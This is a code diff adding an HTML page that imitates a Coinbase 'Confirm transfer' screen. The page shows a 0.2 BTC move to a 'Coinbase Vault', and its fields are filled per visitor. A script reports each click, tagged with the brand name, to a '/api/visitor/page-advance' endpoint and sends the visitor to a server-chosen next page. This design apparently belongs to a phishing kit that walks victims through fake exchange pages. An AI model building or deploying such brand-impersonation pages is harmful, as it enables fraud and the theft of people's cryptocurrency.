@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en" class="dark" style="color-scheme: dark;">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Confirm transfer</title>
+<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
+<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
+<style>
+.vm{min-height:100vh;background:#000;color:#fff;font-family:'CoinbaseSansFont',system-ui,sans-serif;max-width:480px;margin:0 auto}
+.vm-hd{display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid #1f2937}
+.vm-back{background:none;border:0;color:#fff;padding:4px;cursor:pointer}
+.vm-body{padding:20px}
+.vm-hero{text-align:center;margin:20px 0 28px}
+.vm-hero img{width:64px;height:64px;border-radius:50%;margin-bottom:12px}
+.vm-hero h2{margin:0;font-size:22px;font-weight:700}
+.vm-hero p{margin:4px 0 0;color:#6b7280;font-size:14px}
+.vm-card{background:#111;border-radius:14px;padding:4px 16px;margin-bottom:16px}
+.vm-row{display:flex;justify-content:space-between;align-items:flex-start;padding:14px 0;border-bottom:1px solid #1f2937;font-size:14px}
+.vm-row:last-child{border-bottom:0}
+.vm-row .l{color:#6b7280}
+.vm-row .r{text-align:right;font-weight:600}
+.vm-row .r small{display:block;color:#6b7280;font-weight:400;font-size:12px;margin-top:2px}
+.vm-row .free{color:#4ade80}
+.vm-info{background:rgba(59,130,246,.12);border-radius:12px;padding:14px 16px;display:flex;gap:10px;font-size:13px;color:#cbd5e1;line-height:1.45;margin-bottom:20px}
+.vm-btn{width:100%;height:52px;border-radius:9999px;font-weight:600;font-size:16px;border:0;background:rgb(87,139,250);color:#0a0b0d;cursor:pointer;font-family:inherit;margin-bottom:12px}
+.vm-cancel{width:100%;background:none;border:0;color:#fff;font-weight:600;font-size:15px;cursor:pointer;padding:12px}
+</style>
+</head>
+<body style="margin:0">
+<div class="vm">
+  <header class="vm-hd">
+    <button type="button" class="vm-back" aria-label="Back"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+    <h1 style="margin:0;font-size:17px;font-weight:600">Confirm transfer</h1>
+  </header>
+  <div class="vm-body">
+    <div class="vm-hero">
+      <img data-rv-var-img="coinImg" src="/_next/static/media/bitcoin.44da609b.png" alt="">
+      <h2 data-rv-var="coinName">Bitcoin</h2>
+      <p data-rv-var="coinSymbol">BTC</p>
+    </div>
+    <div class="vm-card">
+      <div class="vm-row"><span class="l">Asset</span><span class="r" data-rv-var="amountAssetLine">Bitcoin (BTC)</span></div>
+      <div class="vm-row"><span class="l">Amount</span><span class="r"><span data-rv-var="amountDisplay">0.2 BTC</span><small data-rv-var="amountUsdDisplay">$15,636.29</small></span></div>
+      <div class="vm-row"><span class="l">From</span><span class="r" data-rv-var="from">Coinbase</span></div>
+      <div class="vm-row"><span class="l">To</span><span class="r" data-rv-var="to">Coinbase Vault</span></div>
+      <div class="vm-row"><span class="l">Network fee</span><span class="r free" data-rv-var="networkFee">Free</span></div>
+    </div>
+    <div class="vm-info">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+      <span><span data-rv-var="amountDisplay">0.2 BTC</span> will be transferred from <span data-rv-var="from">Coinbase</span> to <span data-rv-var="to">Coinbase Vault</span>. Verification may be required.</span>
+    </div>
+    <button id="rv-transfer" type="button" class="vm-btn" data-rv-var="transferButton">Transfer BTC</button>
+    <button type="button" class="vm-cancel">Cancel</button>
+  </div>
+</div>
+<script>
+document.getElementById('rv-transfer').addEventListener('click',function(){
+  var b=this;b.disabled=true;
+  fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Confirm Transfer',choice:'transfer'})})
+    .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else b.disabled=false;});
+});
+</script>
+</body>
+</html>
